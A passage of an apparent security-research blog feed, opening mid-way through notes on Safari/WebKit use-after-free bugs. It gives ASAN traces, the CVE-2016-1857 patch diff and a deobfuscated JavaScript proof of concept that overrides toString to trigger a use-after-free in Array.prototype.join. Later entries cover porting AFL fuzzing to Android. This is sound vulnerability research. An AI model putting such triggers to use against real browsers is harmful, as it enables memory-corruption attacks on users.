&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;freed by thread T0 here:
    #0 0x110fe7799 in wrap_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/7.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x43799)
    #1 0x1158d7fa5 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2dcdfa5)
    #2 0x1157dc613 in bmalloc::Deallocator::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2cd2613)
    #3 0x1157dc5b5 in bmalloc::Cache::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2cd25b5)
    #4 0x1157db314 in bmalloc::api::free(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2cd1314)
    #5 0x1157da9a4 in WTF::fastFree(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2cd09a4)
    #6 0x1199409a4 in WebCore::Node::operator delete(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2fa9a4)
    #7 0x11b6a97c1 in WebCore::HTMLIFrameElement::~HTMLIFrameElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x20637c1)
    #8 0x11dbcbaf6 in WebCore::Node::removedLastRef() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x4585af6)
    #9 0x11965e48e in WebCore::Node::deref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x1848e)
    #10 0x11dbbbf04 in WebCore::Node::derefEventTarget() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x4575f04)
    #11 0x11a66ad82 in WebCore::EventTarget::deref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x1024d82)
    #12 0x11ab6d1e9 in WTF::Ref&amp;lt;WebCore::EventTarget&amp;gt;::~Ref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x15271e9)
    #13 0x11ab4d9c4 in WTF::Ref&amp;lt;WebCore::EventTarget&amp;gt;::~Ref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x15079c4)
......
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;setIntegralAttribute(marginwidthAttr, marginWidth);&lt;/code&gt; caused a garbage collection to get &lt;strong&gt;ownerFrameElement&lt;/strong&gt; freed, &lt;code class=&quot;highlighter-rouge&quot;&gt;ownerFrameElement.marginHeight()&lt;/code&gt; will read the freed memory and UAF happened.&lt;/p&gt;

&lt;p&gt;This is because &lt;code class=&quot;highlighter-rouge&quot;&gt;setIntegralAttribute(marginwidthAttr, marginWidth);&lt;/code&gt; will trigger &lt;strong&gt;DOMSubtreeModified&lt;/strong&gt; event so that javascript code execution fall back into attacker’s hand, remove the form node and force to garbage collection will get the container object freed.&lt;/p&gt;

&lt;p&gt;This vulnerability isn’t as complex as CVE-2017-2362, the hole to break TOCTOU is &lt;code class=&quot;highlighter-rouge&quot;&gt;setIntegralAttribute(marginwidthAttr, marginWidth);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CVE-2016-1857&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gu&quot;&gt;@@ -495,9 +495,8 @@ static inline JSValue join(ExecState&amp;amp; state, JSObject* thisObject, StringView se
&lt;/span&gt;         bool holesKnownToBeOK = false;
         for (unsigned i = 0; i &amp;lt; length; ++i) {
             if (JSValue value = data[i].get()) {
&lt;span class=&quot;gd&quot;&gt;-                joiner.append(state, value);
-                if (state.hadException())
-                    return jsUndefined();
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+                if (!joiner.appendWithoutSideEffects(state, value))
+                    goto generalCase;
&lt;/span&gt;             } else {
                 if (!holesKnownToBeOK) {
                     if (holesMustForwardToPrototype(state, thisObject))
&lt;span class=&quot;gu&quot;&gt;@@ -545,9 +544,8 @@ static inline JSValue join(ExecState&amp;amp; state, JSObject* thisObject, StringView se
&lt;/span&gt;         auto data = storage.vector().data();
         for (unsigned i = 0; i &amp;lt; length; ++i) {
             if (JSValue value = data[i].get()) {
&lt;span class=&quot;gd&quot;&gt;-                joiner.append(state, value);
-                if (state.hadException())
-                    return jsUndefined();
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+                if (!joiner.appendWithoutSideEffects(state, value))
+                    goto generalCase;
&lt;/span&gt;             } else
                 joiner.appendEmptyString();
         }

&lt;span class=&quot;gd&quot;&gt;-ALWAYS_INLINE void JSStringJoiner::append(ExecState&amp;amp; state, JSValue value)
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+ALWAYS_INLINE bool JSStringJoiner::appendWithoutSideEffects(ExecState&amp;amp; state, JSValue value)
&lt;/span&gt; {
     // The following code differs from using the result of JSValue::toString in the following ways:
     // 1) It&#39;s inlined more than JSValue::toString is.
&lt;span class=&quot;gu&quot;&gt;@@ -105,35 +106,44 @@ ALWAYS_INLINE void JSStringJoiner::append(ExecState&amp;amp; state, JSValue value)
&lt;/span&gt;     // 3) It doesn&#39;t create a JSString for numbers, true, or false.
     // 4) It turns undefined and null into the empty string instead of &quot;undefined&quot; and &quot;null&quot;.
     // 5) It uses optimized code paths for all the cases known to be 8-bit and for the empty string.
&lt;span class=&quot;gi&quot;&gt;+    // If we might make an effectful calls, return false. Otherwise return true.
&lt;/span&gt; 
     if (value.isCell()) {
         JSString* jsString;
&lt;span class=&quot;gd&quot;&gt;-        if (value.asCell()-&amp;gt;isString())
-            jsString = asString(value);
-        else
-            jsString = value.toString(&amp;amp;state);
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+        if (!value.asCell()-&amp;gt;isString())
+            return false;
+        jsString = asString(value);
&lt;/span&gt;         append(jsString-&amp;gt;viewWithUnderlyingString(state));
&lt;span class=&quot;gd&quot;&gt;-        return;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+        return true;
&lt;/span&gt;     }
 
     if (value.isInt32()) {
         append8Bit(state.vm().numericStrings.add(value.asInt32()));
&lt;span class=&quot;gd&quot;&gt;-        return;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+        return true;
&lt;/span&gt;     }
     if (value.isDouble()) {
         append8Bit(state.vm().numericStrings.add(value.asDouble()));
&lt;span class=&quot;gd&quot;&gt;-        return;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+        return true;
&lt;/span&gt;     }
     if (value.isTrue()) {
         append8Bit(state.vm().propertyNames-&amp;gt;trueKeyword.string());
&lt;span class=&quot;gd&quot;&gt;-        return;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+        return true;
&lt;/span&gt;     }
     if (value.isFalse()) {
         append8Bit(state.vm().propertyNames-&amp;gt;falseKeyword.string());
&lt;span class=&quot;gd&quot;&gt;-        return;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+        return true;
&lt;/span&gt;     }
     ASSERT(value.isUndefinedOrNull());
     appendEmptyString();
&lt;span class=&quot;gi&quot;&gt;+    return true;
+}
+
+ALWAYS_INLINE void JSStringJoiner::append(ExecState&amp;amp; state, JSValue value)
+{
+    if (!appendWithoutSideEffects(state, value)) {
+        JSString* jsString = value.toString(&amp;amp;state);
+        append(jsString-&amp;gt;viewWithUnderlyingString(state));
+    }
&lt;/span&gt; }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Simply says, it added a effectful check to avoid operating on cached butterfly after &lt;strong&gt;toString()&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The original PoC is obfuscated, deobfuscate it as follows:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bigArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;bigArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;bigArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;    
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stringResult&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bigArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now the vulnerability is obviously, check the ASAN:&lt;/p&gt;

&lt;p&gt;Use:	&lt;code class=&quot;highlighter-rouge&quot;&gt;data[i].get()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ERROR: AddressSanitizer: heap-use-after-free on address 0x631000090058 at pc 0x0001105c607c bp 0x7fff55e027d0 sp 0x7fff55e027c8
READ of size 8 at 0x631000090058 thread T0
    #0 0x1105c607b in JSC::WriteBarrierBase&amp;lt;JSC::Unknown&amp;gt;::get() const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x20f07b)
    #1 0x110720c71 in JSC::join(JSC::ExecState&amp;amp;, JSC::JSObject*, WTF::StringView) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x369c71)
    #2 0x110717aa3 in JSC::arrayProtoFuncJoin(JSC::ExecState*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x360aa3)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Free:	&lt;code class=&quot;highlighter-rouge&quot;&gt;bigArray.push(func)&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;freed by thread T0 here:
    #0 0x10e89d799 in wrap_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/7.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x43799)
    #1 0x113061a94 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2caaa94)
    #2 0x112f56273 in bmalloc::Deallocator::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9f273)
    #3 0x112f56215 in bmalloc::Cache::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9f215)
    #4 0x112f54ce4 in bmalloc::api::free(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9dce4)
    #5 0x112f543e4 in WTF::fastAlignedFree(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9d3e4)
    #6 0x110cbcc31 in JSC::CopiedBlock::destroy(JSC::Heap&amp;amp;, JSC::CopiedBlock*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x905c31)
    #7 0x110cbf4d8 in JSC::CopiedSpace::tryReallocateOversize(void**, unsigned long, unsigned long) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x9084d8)
    #8 0x110cbeca4 in JSC::CopiedSpace::tryReallocate(void**, unsigned long, unsigned long) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x907ca4)
    #9 0x1123437c1 in JSC::Heap::tryReallocateStorage(JSC::JSCell*, void**, unsigned long, unsigned long) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1f8c7c1)
    #10 0x11233ce55 in JSC::Butterfly::growArrayRight(JSC::VM&amp;amp;, JSC::JSCell*, JSC::Structure*, unsigned long, bool, unsigned long, unsigned long) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1f85e55)
    #11 0x11232f03c in JSC::JSObject::ensureLengthSlow(JSC::VM&amp;amp;, unsigned int) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1f7803c)
    #12 0x11212021b in JSC::JSObject::ensureLength(JSC::VM&amp;amp;, unsigned int) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1d6921b)
    #13 0x112336554 in bool JSC::JSObject::putByIndexBeyondVectorLengthWithoutAttributes&amp;lt;(unsigned char)8&amp;gt;(JSC::ExecState*, unsigned int, JSC::JSValue) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1f7f554)
    #14 0x112114ce6 in JSC::JSArray::push(JSC::ExecState*, JSC::JSValue) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1d5dce6)
    #15 0x11142723b in operationArrayPush (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x107023b)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;JSC::join(JSC::ExecState&amp;amp;, JSC::JSObject*, WTF::StringView)&lt;/code&gt; will call &lt;code class=&quot;highlighter-rouge&quot;&gt;toSting()&lt;/code&gt; to do type conversion to every non-String element of the array passed in, and attacker could just overide the &lt;code class=&quot;highlighter-rouge&quot;&gt;toString()&lt;/code&gt; callback to add some side effects causing the butterfly reallocated.&lt;/p&gt;

&lt;p&gt;This vulnerability looks as same as CVE-2017-2362, but it is diffrent, &lt;code class=&quot;highlighter-rouge&quot;&gt;auto data = storage.vector().data();&lt;/code&gt; cached the address of the vector container artificially which is a very dangerous operation.&lt;/p&gt;

&lt;h2 id=&quot;summerise&quot;&gt;Summerise&lt;/h2&gt;

&lt;p&gt;Many other UAFs are made of accesing resources by muti threads or processes. But in browsers, JavaScript engines allows overiding prototype’s callback which make native code execution path in flexible, so that one thread can also cause unexpected UAF if TOCTOU was violated. Focus on functions that will trigger any handler event, and type conversions that have implicit callbacks, be aware of the location of variable, focus it when the global of member variable is cached, try to find if there is a TOCTOU hole between two access operation of the cache.&lt;/p&gt;</content><category term="933KY" /><category term="Notes" /><category term="UAF" /><category term="Attack Model" /><summary>Notes of several UAFs on Safari</summary></entry><entry><title>My name is Skrillex</title><link href="/an1m4l/My-name-is-Skrillex/" rel="alternate" type="text/html" title="My name is Skrillex" /><published>2016-05-31T00:00:00+08:00</published><updated>2016-05-31T00:00:00+08:00</updated><id>/an1m4l/My-name-is-Skrillex</id><content type="html" xml:base="/an1m4l/My-name-is-Skrillex/">&lt;embed src=&quot;http://player.youku.com/player.php/sid/XMTU5MDI4NTg5Ng==/v.swf&quot; allowfullscreen=&quot;true&quot; quality=&quot;high&quot; width=&quot;480&quot; height=&quot;400&quot; align=&quot;middle&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; /&gt;

&lt;p&gt;First play, just have a try.&lt;/p&gt;</content><category term="AN1M4L" /><category term="lunchpad" /><summary>The first lunchpad play</summary></entry><entry><title>An universal way to fuzz a running process by using AFL</title><link href="/dr01d-s3c/An-universal-way-to-fuzz-a-running-process-by-using-AFL/" rel="alternate" type="text/html" title="An universal way to fuzz a running process by using AFL" /><published>2016-05-30T00:00:00+08:00</published><updated>2016-05-30T00:00:00+08:00</updated><id>/dr01d-s3c/An-universal-way-to-fuzz-a-running-process-by-using-AFL</id><content type="html" xml:base="/dr01d-s3c/An-universal-way-to-fuzz-a-running-process-by-using-AFL/">&lt;p&gt;In &lt;a href=&quot;http://arayz.github.io/dr01d-s3c/AFL-on-Android/&quot;&gt;AFL on Android&lt;/a&gt;, I introduced how 
am I porting AFL from Linux to Android. It’s certainly that AFL could run on Android as 
it running on Linux, but I ran into a stone wall when I try to fuzz system_server on 
Android, the difficulty is AFL dosen’t support for fuzzing an running process officially. 
Android system service dosen’t provide any dirrect interface to transact data to its 
bussiness logic. AFL observe and send test cases by forking a subprocess to execute the 
tartget binary file, and system_server boots up in a very earlly time before all zygote 
processes.&lt;/p&gt;

&lt;p&gt;An easily-come-up way to solve this problem is editting init.rc to let afl-fuzz boots up 
app_process so that system_server becomes afl-fuzz’s subprocess. However, it’s difficult to 
put into effect because this is a big change to whole Android system.&lt;/p&gt;

&lt;p&gt;One another way is modifying source code of afl-fuzz to transact payload to system services 
instead pipe, this is a feasible scheme but I finally choose a universal way because it’s 
better not to modify code of an native program as possible.&lt;/p&gt;

&lt;p&gt;I design this as a bridge from afl-fuzz to target process. afl-fuzz execute bridge as 
subprocess and send test cases to it, bridge transact these test cases to target process 
and observe crashes by checking pid of it, bridge send back a signal by raise(SIGKILL) to 
afl-fuzz when target process gets crash. Both bridge and target process need to be instrumented 
by afl-gcc to get fork-server and coverage mesurements on.&lt;/p&gt;

&lt;p&gt;A difficult point is that afl-fuzz delivers fd of shared_mem to target process by setenv() 
in native architecture and it takes no effect to whole shell so that target process could 
not receive env of afl-fuzz in the bridge architecture, so a shared file is needed to deliver 
fd of shared_mem.&lt;/p&gt;

&lt;p&gt;The architecture is as follows:
&lt;img src=&quot;/images/afl_arch.jpg&quot; alt=&quot;arch&quot; /&gt;&lt;/p&gt;</content><category term="DR01D-S3C" /><category term="AFL" /><category term="Fuzz" /><summary>Fuzz a running process by using AFL</summary></entry><entry><title>AFL on Android</title><link href="/dr01d-s3c/AFL-on-Android/" rel="alternate" type="text/html" title="AFL on Android" /><published>2016-05-08T00:00:00+08:00</published><updated>2016-05-08T00:00:00+08:00</updated><id>/dr01d-s3c/AFL-on-Android</id><content type="html" xml:base="/dr01d-s3c/AFL-on-Android/">&lt;p&gt;AFL(American Fuzzy Lop) is a powerful fuzzer for binary on Linux, it employs 
genetic algorithms to discover interesting signals in runtime, but it doesn’
support for running on Android officially, so I just work to porting AFL to
Android and get afl-fuzz running on emulator with arch-x86.&lt;/p&gt;

&lt;p&gt;In order to porting completly, I have to cross compile afl-fuzz with bionic 
and use afl-gcc to instrument the binary I want to fuzz to get fork server 
and coverage measurements on.&lt;/p&gt;

&lt;p&gt;Compiling afl-fuzz is much easier than instrumening the binary, just put whole 
source folder to “(AOSP)/development/” and execute “mm” on the path with an 
Android.mk in it, but if you do so, you will just get some errors. The key 
problem is expecting shm on bionic, Android use ashmem to replace shm, so you 
need to use ashmem_create_region to create fd instead shmget, and just mmap 
the address instead shmat, when work is done, just munmap it instead shmctl.
Another one thing you need to do is to comment the termminal size check in the 
afl-fuzz.c, or the UI won’t appear as normal.&lt;/p&gt;

&lt;p&gt;The bigger challenge of porting AFL is instrumenting target binary. AFL’s 
documents tell me to set CC and CXX env to replace compiler but AOSP use cross 
compile toolchains and the makefile is so complicated. By reading afl-gcc.c, 
I found it just set some params to replace assembler to instrument instructions, 
and deliver remaining work to the original compiler when instumenting work is 
done, so I could just replace the original compiler and point the cross compile 
toolchain to get binary instrumented and cross compiled.The flow diagram is as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/flow-diagram.jpg&quot; alt=&quot;flow-diagram&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To replace compiler, just add LOCAL_CXX and LOCAL_CC to your afl-gcc in Android.mk,
set AFL_CXX, AFL_CC and AFL_AS to your AOSP cross compile toolchain. After that, 
execute “lunch” to choose arch-x86 product and “mm” your source code.&lt;/p&gt;

&lt;p&gt;One last problem is the shell code to be instrument produced by official AFL is x86 
based only, and it containing shm calling instructions, so you need to write ashmem 
calling shell codes to replace them, and you need to rewrite whole shell codes of AFL 
if you want to porting AFL to arch-arm, that’s potential work to do in the future.&lt;/p&gt;

&lt;p&gt;I made afl-fuzz running on Android-5.1.1-x86 successfully, and I add param ‘-t 100’ to 
give emulator some more time to wait for signals because the binary running on emulator 
is much slower than host PC.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/afl-fuzz.jpg&quot; alt=&quot;afl-fuzz&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sorry code is not published yet.&lt;/p&gt;</content><category term="DR01D-S3C" /><category term="AFL" /><category term="fuzz" /><category term="porting" /><summary>Porting AFL to Android</summary></entry><entry><title>Pure</title><link href="/ch402/Pure/" rel="alternate" type="text/html" title="Pure" /><published>2016-05-02T00:00:00+08:00</published><updated>2016-05-02T00:00:00+08:00</updated><id>/ch402/Pure</id><content type="html" xml:base="/ch402/Pure/">&lt;p&gt;I took one whole holiday to set up this blog system on github pages. It’s been near a year since I ungraduated from college and never take a real holiday.&lt;/p&gt;

&lt;p&gt;I just work on mobile security research and get intervolution with my fear and anger.
Maybe the difference between they and me is I’m lack of some pure. Abandoning emotion is
too hard for me and they just exceed me with this.&lt;/p&gt;

&lt;p&gt;Can it ferment if I keep immersioning in emotion?&lt;/p&gt;</content><category term="CH402" /><category term="Pure" /><summary>The first blog</summary></entry></feed>
